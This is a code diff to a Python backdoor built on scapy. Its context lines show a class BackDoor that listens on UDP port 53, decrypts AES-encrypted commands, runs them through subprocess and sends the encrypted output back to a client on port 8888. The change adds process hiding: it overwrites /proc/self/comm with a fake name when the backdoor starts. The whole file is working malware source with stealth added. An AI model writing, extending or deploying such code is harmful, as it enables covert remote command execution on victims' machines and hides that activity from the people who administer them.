@@ -5,7 +5,7 @@ from scapy.all import sniff, send
 from scapy.volatile import RandShort
 from subprocess import run
 import sys
-
+import os
 
 
 class BackDoor:
@@ -18,8 +18,10 @@ class BackDoor:
         self.port = 53
         self.client_port = 8888
         self.client = ""
+        self.masked_name = "MASKED_PROCESS"
 
     def start(self):
+        self.hide_process()
         print("Starting.....")
         print("Listening for packets")
         print("--------------------------------------------------------------")
@@ -73,6 +75,7 @@ class BackDoor:
         output = output.stdout
         msg = self.prepare_msg(output)
         self.craft_packet(msg)
+
     def filter_packets(self, packet) -> None:
         try:
             msg = packet[UDP].load.decode()
@@ -103,8 +106,6 @@ class BackDoor:
         print(f"Decrypted message: {msg}")
         return msg
 
-
-
     def encrypt_data(self, cipher, line) -> bytes:
         """Encrypts message"""
         encryptor = cipher.encryptor()
@@ -115,10 +116,13 @@ class BackDoor:
         encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
         return encrypted_line
 
-
     def set_hex(self):
         self.hex_data = ""
 
     def generate_cipher(self) -> Cipher:
         """Generates cipher for encryption"""
         return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
+
+    def hide_process(self):
+        with open("/proc/self/comm", "w") as f:
+            f.write(self.masked_name)
